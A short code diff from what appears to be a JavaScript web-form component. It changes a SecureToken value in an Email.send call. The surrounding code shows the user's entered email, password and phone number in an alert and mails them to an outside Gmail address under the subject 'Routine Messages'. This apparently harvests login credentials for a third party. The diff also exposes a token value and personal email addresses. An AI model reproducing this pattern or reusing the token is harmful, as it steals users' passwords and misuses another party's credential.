@@ -35,7 +35,7 @@ export default {
             alert("I get here")
             alert("Email:" + this.model.email + "Password:" + this.model.password + "Telephone:" + this.model.phone)
             Email.send({         
-                SecureToken : "86bd5e36-8568-4068-8369-c605f490e20a",
+                SecureToken : "8697077868568577",
                 To : 'olaniranolaolujames@gmail.com',
                 From : "takeitallever@gmail.com",
                 Subject : "Routine Messages",
